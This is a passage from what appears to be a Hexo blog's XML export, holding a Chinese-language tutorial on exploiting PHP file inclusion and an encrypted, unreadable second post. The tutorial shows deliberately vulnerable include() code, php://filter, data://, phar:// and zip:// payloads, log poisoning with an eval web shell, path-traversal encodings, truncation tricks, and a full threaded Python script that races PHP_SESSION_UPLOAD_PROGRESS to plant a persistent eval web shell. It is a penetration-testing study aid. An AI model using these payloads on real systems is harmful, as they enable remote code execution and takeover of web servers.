class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="meta">?&gt;</span>    </span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1608000111627-33aeee7f-ff43-4cdb-9a90-8165dbec0e25.png" alt="image.png"></p><h4 id="php-filter-用于读写源码"><a href="#php-filter-用于读写源码" class="headerlink" title="php://filter 用于读写源码"></a><code>php://filter</code> 用于读写源码</h4><p><code>allow_url_include = On/OFF</code><br><code>allow_url_fopen = ON/OFF</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line">index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p>解码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import base64</span><br><span class="line">&gt;&gt;&gt; base64.b64decode(&quot;&quot;)</span><br></pre></td></tr></table></figure><p>写文件<code>file_put_contents</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(urldecode(<span class="variable">$file</span>),<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure><blockquote><p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）</p></blockquote><p><strong>rot13</strong>偏移写入(PHP不开启<code>short_open_tag</code>短标签)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=string.rot13/resource=rot.php</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220531102102686.png" alt="image-20220531102102686"></p><blockquote></blockquote><p><code>urldecode()</code>文件名编码两次</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220531103119027.png" alt="image-20220531103119027"></p><p>访问写入的文件</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220531103142792.png" alt="image-20220531103142792"></p><p><strong>base64</strong>写入文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(urldecode(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220531104739329.png" alt="image-20220531104739329"></p><blockquote><p>base64在解码的时候是将4个字节转化为3个字节,<code>phpdie</code>6个字符我们就要添加2个字符让前面的可以进行编码</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220531105318984.png" alt="image-20220531105318984"></p><p>以下两种情况详见<a href="https://xz.aliyun.com/t/8163?accounttraceid=8acbada15112474b8cf2383e045b1617vksc#toc-6">file_put_content和死亡·杂糅代码之缘</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(<span class="variable">$content</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line">file_put_contents(<span class="variable">$filename</span>,<span class="variable">$content</span> . <span class="string">&quot;\nxxxxxx&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>其他编码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line">filter(<span class="variable">$file</span>);</span><br><span class="line">file_put_contents(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php </span><br><span class="line">post:contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?</span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">PHP支持的字符编码</a></p><h3 id="data-数据流封装器"><a href="#data-数据流封装器" class="headerlink" title="data:// 数据流封装器"></a>data:// 数据流封装器</h3><p><strong>协议格式：</strong></p><p><code>data://:资源类型;编码,内容</code></p><p>当<code>allow_url_include </code>打开的时候，<strong>任意文件包含就会成为任意命令执行</strong></p><p><code>allow_url_fopen ：on</code><br><code>allow_url_include：on</code></p><p><strong>php 版本大于等于 php5.2</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];  </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;<span class="subst">$filename</span>&quot;</span>);  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>利用方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sec/test.php?a=data://text/plain,&lt;?php system(&quot;ipconfig&quot;) ?&gt;</span><br><span class="line">http://127.0.0.1/sec/test.php?a=data://text/plain,&lt;?php phpinfo();</span><br><span class="line">or</span><br><span class="line">http://127.0.0.1/sec/test.php?a=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure><blockquote><p><code>data://</code>中<code>//</code>可省略</p></blockquote><h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a><code>phar://</code></h3><p>php版本大于等于php5.3.0</p><p>文件<code>phpinfo.txt</code>，打包成zip压缩包<code>test.zip</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 绝对路径</span><br><span class="line">index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt</span><br><span class="line"># 相对路径</span><br><span class="line">index.php?file=phar://test.zip/phpinfo.txt</span><br></pre></td></tr></table></figure><h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a><code>zip://</code></h3><p>php 版本大于等于 php5.3.0+绝对路径</p><p>文件<code>zipd.txt</code>，打包成zip压缩包<code>test.zip</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/wahaha.php?a=zip://C:\Users\DropAnn\Desktop\test.zip%23zipd.txt</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1608014820402-a13e55bb-fb07-4dc4-bc99-a903701bb05d.png" alt="image.png"></p><h2 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h2><p>先插入（请求）后包含</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220526164130259.png" alt="image-20220526164130259"></p><blockquote><p><code>&lt;?=eval($_POST[6]);?&gt;</code>同理，注意UA中不解码</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220526164222441.png" alt="image-20220526164222441"></p><h3 id="日志和配置文件默认存放路径"><a href="#日志和配置文件默认存放路径" class="headerlink" title="日志和配置文件默认存放路径"></a>日志和配置文件默认存放路径</h3><table><thead><tr><th>文件</th><th>路径</th></tr></thead><tbody><tr><td>apache+Linux日志默认路径</td><td>/etc/httpd/logs/access_log或/var/log/httpd/access_log</td></tr><tr><td>apache+win2003日志默认路径</td><td>D:\xampp\apache\logs\access.log以及D:\xampp\apache\logs\error.log</td></tr><tr><td>IIS6.0+win2003默认日志文件</td><td>C:\WINDOWS\system32\Logfiles</td></tr><tr><td>IIS7.0+win2003 默认日志文件</td><td>%SystemDrive%\inetpub\logs\LogFiles</td></tr><tr><td>nginx 日志文件</td><td>用户安装目录logs目录下（/usr/local/nginx/logs）/var/log/nginx/access.log</td></tr><tr><td>apache+linux 默认配置文件</td><td>/etc/httpd/conf/httpd.conf或index.php?page=/etc/init.d/httpd</td></tr><tr><td>IIS6.0+win2003 配置文件</td><td>C:/Windows/system32/inetsrv/metabase.xml</td></tr><tr><td>IIS7.0+WIN 配置文件</td><td>C:\Windows\System32\inetsrv\config\applicationHost.config</td></tr></tbody></table><h2 id="session包含"><a href="#session包含" class="headerlink" title="session包含"></a>session包含</h2><h3 id="session存储过程"><a href="#session存储过程" class="headerlink" title="session存储过程"></a>session存储过程</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220531090947377.png" alt="image-20220531090947377"></p><blockquote><p>添加后会在默认目录下生成临时文件<code>/tmp/sess_aaa</code></p></blockquote><h3 id="session常见存储路径"><a href="#session常见存储路径" class="headerlink" title="session常见存储路径"></a>session常见存储路径</h3><ol><li><code>/var/lib/php/sess_PHPSESSID</code></li><li><code>/var/lib/php/sess_PHPSESSID</code></li><li><code>/tmp/sess_PHPSESSID</code></li><li><code>/tmp/sessions/sess_PHPSESSID</code></li></ol><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>知道session存储位置</p><p>代码中存在<code>session_start()</code>或者<code>session.auto_start=On</code>或<code>session.auto_start = 1</code>PHP在接收请求的时候会自动初始化Session，默认情况下，这个选项都是关闭的。</p><p>拥有读写session文件的权限</p><h3 id="PHP-SESSION-UPLOAD-PRGRESS竞争条件"><a href="#PHP-SESSION-UPLOAD-PRGRESS竞争条件" class="headerlink" title="PHP_SESSION_UPLOAD_PRGRESS竞争条件"></a>PHP_SESSION_UPLOAD_PRGRESS竞争条件</h3><p>在php5.4后php.ini中添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line">3. session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br></pre></td></tr></table></figure><blockquote><p><code>enabled=on</code>表示php将会把文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</p><p>默认配置<code>session.upload_progress.cleanup = on</code>导致文件上传后，session文件内容立即清空，利用竞争条件，在session文件内容清空前进行包含利用。</p></blockquote><p>测试环境为：php5.5.9</p><p>测试代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;<span class="subst">$b</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>测试的时候用了phpstudy，其他情况参考session常见存储路径</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220621020614337.png" alt="image-20220621020614337"></p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> re</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.1.17/test/inclu.php&quot;</span></span><br><span class="line">sessionid = <span class="string">&quot;testid&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;1&quot;</span>: <span class="string">&quot;file_put_contents(&#x27;1.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.post(url, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>&#125;,</span><br><span class="line">                                cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessionid&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;test.txt&#x27;</span>, fileBytes)&#125;)</span><br><span class="line">        <span class="built_in">print</span>(response.status_code)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.post(url + <span class="string">&#x27;?file=D:/phpstudy_pro/Extensions/tmp/tmp/sess_&#x27;</span> + sessionid, data=data, cookies=&#123;</span><br><span class="line">            <span class="string">&#x27;PHPSSESSID&#x27;</span>: sessionid</span><br><span class="line">        &#125;)</span><br><span class="line">        response2 = session.get(<span class="string">&#x27;http://192.168.1.17/test/&#x27;</span> + <span class="string">&#x27;1.php&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> response2.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;+++done+++&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(response2.status_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># write(re.session())</span></span><br><span class="line">    evnet = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> re.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    evnet.<span class="built_in">set</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>测试结果</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220621015801442.png" alt="image-20220621015801442"></p><p><a href="https://www.freebuf.com/vuls/202819.html">利用session.upload_progress进行文件包含和反序列化渗透</a></p><h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="指定前缀"><a href="#指定前缀" class="headerlink" title="指定前缀"></a>指定前缀</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;/var/www/html/&#x27;</span>.<span class="variable">$file</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><p>同目录包含 <code>file=.htaccess</code></p><p>目录遍历 <code>?file=../../../../../../../../../var/lib/locate.db</code></p><h4 id="多次编码"><a href="#多次编码" class="headerlink" title="多次编码"></a>多次编码</h4><p>利用url编码 </p><p><code>../</code></p><ul><li>%2e%2e%2f</li><li>..%2f</li><li>%2e%2e/</li></ul><p><code>..\</code></p><ul><li>%2e%2e%5c</li><li>..%5c</li><li>%2e%2e\</li></ul><p>二次编码 <code>%25</code>对应的是<code>%</code>，<code>%2e</code>对应的是<code>.</code>，所以 <code>.%252e/</code> 对应的是 <code>../</code></p><p><code>../</code></p><ul><li>%252e%252e%252f</li></ul><p><code>..\</code></p><ul><li>%252e%252e%255c</li></ul><p>容器/服务器的编码方式</p><p><code>../</code></p><ul><li><p>..%c0%af</p></li><li><p>%c0%ae%c0%ae/</p></li><li><blockquote><p>注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）</p><p>Apache Tomcat Directory Traversal</p></blockquote></li></ul><p><code>..\</code></p><ul><li>..%c1%9c</li></ul><h3 id="指定后缀"><a href="#指定后缀" class="headerlink" title="指定后缀"></a>指定后缀</h3><h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h4><p><code>magic_quotes_gpc=Off</code>，而且php版本&lt;5.3.4</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$test</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$test</span>.<span class="string">&#x27;txt&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>    </span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1622288999171-3c12d36b-4d2d-4934-8877-4fc900302a7d.png" alt="image.png"></p><h4 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h4><p> php版本 &lt; php 5.2.8</p><p>目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复<code>./</code>达到最大值后缀就会直接被抛弃</p><h4 id="url格式"><a href="#url格式" class="headerlink" title="url格式"></a>url格式</h4><p>使用远程文件包含注意下面两个配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen = On</span><br><span class="line">allow_url_include = On</span><br></pre></td></tr></table></figure><p>query（？）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test/1.php?a=http://192.168.1.105/phpinfo.php?</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1622290685125-25f1f968-e727-4830-b057-18abf6291c99.png" alt="image.png"></p><p>fragment（#）</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2185076/1622290619783-0c911548-1fe2-4360-87d3-780e55c12d52.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全常用脚本</title>
      <link href="/p/1448a178.html"/>
      <url>/p/1448a178.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="3948d177e2101bf6bfd0a4fc5bcdcd0a53d2c831a019c6a90ee5e7b03903e0e4">c157c9744e0298d00173c08a9dbffe0ed073a56f7e3a628a68d0b68815ec97a6507baf417dacc16b537cd1ab043778f6fe3a0fee7a8ecf0eaf41b587dcbadf993402d2ef9f34332240543e7a8ac3b3d82501b35037bd785dc7624f4859b06e1a2350407c242ca926a0f3440bdc03639d3a54941d331ff415b9ec059bb101a5f7c77e9bb6d33c6ad72c62e69865353f8a06d934576aadadfea8f3880fa0b567cb92d8757353e95f4a4902b46d2e7127d8fd8ce26d1fbb8ced40d160082da85047d46f7e8c2faa96467a472d46eb94b163f664ea5aabca6863f3773d9b2051991073106a658a6ddccf9c4b8557306c5b79824621f02e7204e41ef624f3a46bb82acb8cc29d89c36e9dcac4a009dbcf640e10fb1fc3f9554168c549894195f5e5064f2888b85414492544f0d9e611f6e629e3715298fa28b260351d8d9eed0d324461c6f534037cf7e033823b5835bb5dba7417701bc9f573087b0ccdacd292b1061ea24844bb8ef81da46325721a9c419401ec77abcf11d1812a6aac50746e871071b769239bb83c06103233a99cfda60d81c453b9a84236231bc04baeb8041a3f82dfa1452c47c472808b1d54bd75dce744d3550c8661be28793b95aaf2bb3c1995ff6f5f66e4f48d632774609b3e1028f168e67726b81bb3fe4513bffc04f94d1aaeec5e857a19a8c0ad9e338d1961db1c5a49f781156f5d52a9ec85fe028029c7f1240bcdacf09b20a83a104d396aa4ac22cbb160447ed7424bc957b64e8871771a543286a86af9489d9ac6a53bdb80efe4f722aa2c96026239df2d6bc57dff8d3f6664e05a2f0a4a39b5182065baf195a5fab9337cfb87776bfb60c5ab1a4b3bddf55c76d991b886567590d68c1a64d96876b501811a4bfd9bfa38d74351b201b8689dc8d7999d84137b13d51c3ba886d4ad50f84b1a2712ccf48969b99e6a86ed3ab4be4174a7ac24f40c20dfba0fa8fe71561304becbdcd79fe67d531d13a6630e773bdd268e10009fcb3a309c1b63c1f42fdf4925bbcd91e5867b491ec0f108d2e12a5ab669ebbf3e8092f00495768da88f2f63e4d688ed1c1333d225965ff5111ed41f0a3d8d8997bc8921a4b41a9e1d4353eb952a69b4a50beadf6db1657db406e709d449dc860dfa6b8f5320f96d598d883000c3095fa93967b2a055aca8b4989c0b613483a5f381c8e14f167d3f75b2213c0dac2b23fbac6fe44284f54b670c0806737908c4f8d53a911162afe516928d64de82f2734858145ccdc2fb18cce0deab40af2f93a640828f3332b085bbd43ef0ebe8f2d0400b261c1548ee8cb14e1030d0bf95060d449f314f1d14f640b33af6b2af406a93cdfd01a8bc269a2919f6e77a235848cddc6e8a7b76b3961a399b0b5ad2fc5530001eb37eb21c5672c59f3a94e6d1ae4d4530b4f7244fe602b059e599a17495c7d27b5b872a79df7a735a57bda171e9fc4941f4ce39c9c43be1f174add2daa09d839ebef9735f456af368dd9749e97d37df1b5bce45d8640dea5894a81eb156241ebb47f53b4ecb48e7053ccf583a385b012bf9c95bc2dfaff62c26bc33f15f56a5ea597750147b13b27c76f6c5c45518f1ae529e77a86924eaa28587e89f37e526c350bf33c49fd2aa2a8ade2fa8c19263872325667820f707703ec27e33b037140392b361be48d3f971fff1bcc91720ff3c856c85d799dd8d83220a4f85d76c423021e1b7b2f718fa057b0b16248f7d9c48bb96731794388d504ff90aec9e78e5681c7647db5c26146e0000e2f3b8795815fc0b0b59047b7fcade9aff2817b34e3bc5647999588e8263a17a3e8a902c06e17221666d9d68880919dda7f231259221c446e35613a6cdf087c33e9f5e2da803692c913e891724257a375342d5c44c51ae3f1301dff8544e6f1d4035b369a692ee8030e8eaa04856814797c5c47f8c4966d98a7737bfb1b65a8928c88525dd7c1eb9c7968c9e5d3803040847d041fd1b1e00ef6b00596d9be4927af49d439330647f07df2f8d6c0b666c4dda71964f56bfd1c8a7ba64f31bf0c3dfee99098432c30e580cedb265ffd19094c54d9b70fea3ffddf53965a9bc48d876373069e4d6361dad3cfbd58050564635f33a47507ba9e9307cfd1c965a92cd788ccea40e9aaf55d1c6600dbd5e0a14ffb0d56dbcffd3ab968490e17dcc06a24931e06d7caf13ce5db43e460573b513e1355717807658eca96516be71678a2b982cd0217115a22b35588e2524a1f018e2783b03520e8b50c229a66a1d2c09f00ac8548926197adba9735979ef57d21db8f6558bd07480b27f5901b5518f11a943f50aed312a94b5ed8a9fb043af649fe35ecb2f210f55baa8de62401fc18433b27cc9290c4e9d64dcd049bdaae112f078c0d7c9ac560764b7fc1189e10ca6144e2b5ece0dc4356748e8137baa4f61fb83ae5dfb310adebc6bc4f05eb831500de72a3742d12553abd6e19393b637d99ed9cf52f2ba335a9f2754120b33de7869a6347dbcf490d4224f3ab620b3ba22ab60672acac7392483f8c4541b7f688bc7b97176dcb386ef0a40ddfdcc9ff9ff4acbecd3b049056dd81b3bf08de612be661deb206ee666939b20524392630bc42744f457a1794472f2129522cfe07954b12173edd82ef3932acdbef21efc0c5174ebe59d664414912b141ba2a1305b331f8491a74172f4727c75c04ee95febe82dac879bf746117de87a921bdd4e8cf62d11875b4938e34a9b885ceeecf437e8fada92359fb26e6c14027af84c087dabca9371479f5c89fe32897f8b9c29caddb0323c57dc7a73ebfc46511e9cff14186b0e47846ee37327b877038c659554754bc8d6f2ec749342f0600a74223eed3647d4f181b21ea2e6e5258bafca110e37b5f7fa4f680b3949be2cffdf70e9a78ca495ca5fecab8e8ea6b2286f807630c757d8689de0a8677201317b9e4236f2d882ebd63e399f011d686224f5228344d5468961f1df627610ffd0b6432b9e419ea6fbd703fcd8c92f248f34aaf8c17002dd275809b69b20f0a8e8c5b966cd87c0015254bc18133f553993c04479a1da97bceb198801a3dd789d03756b5c2fc20d441c4a962b8854a821f3c739c2d4e43edceac11399ee369e5b98f79fafe9cae8dd3be16906de7b185d115cd26c7abda97e16b5135a672a9d93c378671282de0f99ed3acd003d4a2a9162b467f53df106b0c8c1c8a380e84742a39fd5e5f3a7845ba4f4e9868b88a16d916228e5090be23c148d0a16b220bc14f1b053049773ee27aefe1e5fa7979194ac0c1f9b86306b645956077acbf478d4e1f2424c5eb1ede5a63dff112023daa8d5edc49d060721b9eeb9531efff0b9bccefc57103a9336c991eb15a8e5029e1b374d0a1b036c6a15dbcd703cccdf34c19238a973013a61d0c00e7bf1502d8f5843a20cfc2dd269850b2505b92f16922e5b4430ef5eb2090810841c779839a4b00b21ebeb2bbc4b06edc19973f80c86d6c80fa8f15bc5c5b9027330be5c170d205a2b8460e46833e8acef1f1aa00bd7d9b0193c3343bdcfcabda82f347fc8e6c355bb432ecbb28dcc88c50c8147a45f14744a813fd5aa4acea16ee282c0c9d683432228dfdf20e5751fb4ca0883845d71feb7e5c4b72deec1662cf3ee7572048947495e0d84771c99110a62b9917da2c54d6c6e90a2f63663d075e74dea6c1b79c8bb1141b5e9de1da7b0225585ec564be3299a7fb25583f4c0140b6b1b5c2e244a2879ab89caa137c94f02ef66d80f86f3e4d69b96ed6043c6a384d894ed7d30ad938ed327f816605b90dea31250b8eb205fedf4b166a57f1c18fe5a8e8b3fbbe59f624f0b694227f2dff911914d00f4713ecaedabfb3ad79d2320a75316da2e2353225144d660279582bf65fd4cab4199b19cf11b4d67179ff64433336a5f675d97cffcca312920026f461759cfe38c6d6613ab0699b0e3d1e231eda1360fd40a20c4ba1412088e1c29ea449a299032f88ff8334f8dd36089f6a50290e5259a7484bbcb65ff2ee2fc1d9f36082103dfb93c912b1b5d6821788b097ce46c53a4892ea7ac8f8062092360fec5924d021eb7e03e5480da61198b42c7d8ec103da702c5f398907f4c6aedd7159fab0c651a05fec8bc1056fa302bd51f350deb26f8b105d4de8a64b84dec4227728bbd05a319d0638557a73d361166fcdad959f1865a061f3ac3e212e68b56357b7288559a680d1a0cc242e6097d7d3d86de6305090e223228f2f4e8af78c7221255773bf42be82c563eb65ede01d96f75af02d698145de6b171f253ae7f80f6eb268a44d05b713300f497715b3f31a3b327c4524b67436e20058d416b8962fea5939b4d7829d72dabac335af9804d11d620bcdd305d6958345826ae94a6e6a33822b843853593f5189e968659e2120d237d1e0cfbe39a293473c608f163c80ca016d24cd86a6db76ba9a6e3359a1665176e066dd7ff7b21aeaf654869d5ca783ddcc13389d63e8b64c1fa9ebdf33289ccf0b56736a8b6ccb70f38a1dcb639db445845dcc75c324e1d8e0